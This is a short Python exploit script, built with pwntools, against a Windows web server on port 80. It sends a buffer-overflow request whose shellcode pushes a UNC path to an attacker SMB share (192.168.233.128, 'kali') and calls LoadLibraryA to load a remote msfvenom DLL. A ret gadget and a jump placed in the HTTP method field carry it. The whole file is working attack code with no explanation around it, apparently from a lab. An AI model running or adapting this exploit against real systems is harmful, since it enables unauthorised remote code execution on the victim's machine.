#!/usr/bin/python3
from pwn import remote, p32, asm

# msfvenom -p windows/exec CMD=calc.exe -f dll -o shell.dll
smb = b"\\\\192.168.233.128\\kali\\shell.dll"[::-1].hex()

shellcode  = b""
shellcode += asm("push eax")                  # push string terminator (\x00)

for i in range(0, len(smb), 8):
     shellcode += asm("push 0x" + smb[i:8+i]) # push the smb string in dwords to $esp

shellcode += asm("mov ebx, esp")              # save the smb string in $ebx
shellcode += asm("push ebx")                  # push ptr to the string
shellcode += asm("mov eax, 0x44B5FC90")       # save LoadLibraryA() in $eax with nop
shellcode += asm("shr eax, 0x8")              # delete nop for function addr
shellcode += asm("call dword ptr [eax]")      # call $eax with the smb string as argument

offset = 253
junk = b"A" * (offset - len(shellcode))

payload  = b""
payload += shellcode
payload += junk
payload += p32(0x00418674) # pop eax; ret;

method  = b""
method += asm("xor eax, eax") # zf = 1
method += asm("jng $+0x17")   # if zf == 1 || sf != of

content = method + b" /" + payload + b"\r\n\r\n"

shell = remote("Windows", 80)
shell.sendline(content)
